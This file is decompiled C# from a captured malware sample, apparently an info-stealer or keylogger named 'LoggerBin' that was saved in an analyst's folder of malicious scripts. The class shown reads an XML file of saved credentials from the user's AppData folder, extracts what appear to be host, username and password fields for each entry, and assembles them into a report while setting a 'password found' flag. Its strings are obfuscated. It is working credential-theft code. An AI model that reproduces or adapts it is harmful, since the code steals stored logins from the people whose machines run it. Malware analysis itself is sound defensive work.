// Decompiled with JetBrains decompiler
// Type: FL.DG
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using VW1;

namespace FL
{
  internal static class DG
  {
    private static DG XHG;

    public static string yu()
    {
      if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
        return w4.bx(666, w4.vY);
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + w4.bx(4412, w4.vY);
      StringBuilder stringBuilder = new StringBuilder();
      if (File.Exists(str))
        goto label_4;
label_1:
      return w4.bx(686, w4.vY);
label_4:
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load((XmlReader) new XmlTextReader(str));
        IEnumerator enumerator = xmlDocument.DocumentElement.ChildNodes.GetEnumerator();
        try
        {
          while (enumerator.MoveNext())
          {
            XmlNode current = (XmlNode) enumerator.Current;
            string innerText1 = current.ChildNodes[0].InnerText;
            string innerText2 = current.ChildNodes[1].InnerText;
            string innerText3 = ((XmlNodeList) DG.HHY((object) current))[2].InnerText;
            if (!string.IsNullOrEmpty(innerText1))
            {
              if (!string.IsNullOrEmpty(innerText2))
              {
                if (!string.IsNullOrEmpty(innerText3))
                {
                  stringBuilder.AppendLine(w4.bx(4458, w4.vY) + innerText1);
                  stringBuilder.AppendLine(w4.bx(4482, w4.vY) + innerText2);
                  stringBuilder.AppendLine(w4.bx(1200, w4.vY) + innerText3);
                  stringBuilder.AppendLine(w4.bx(1270, w4.vY));
                }
                else
                  goto label_6;
              }
              else
                goto label_6;
            }
            else
              goto label_6;
          }
          int num1 = 0;
          if (DG.kH4() != null)
            goto label_13;
label_9:
          switch (num1)
          {
            default:
              goto label_6;
          }
label_13:
          int num2;
          num1 = num2;
          goto label_9;
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            disposable.Dispose();
        }
label_6:
        if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
          return w4.bx(934, w4.vY);
        XWr.IsPass = true;
        return stringBuilder.ToString();
      }
      catch
      {
        goto label_1;
      }
    }

    internal static object HHY([In] object obj0) => (object) ((XmlNode) obj0).ChildNodes;

    internal static bool tHA() => DG.XHG == null;

    internal static DG kH4() => DG.XHG;
  }
}
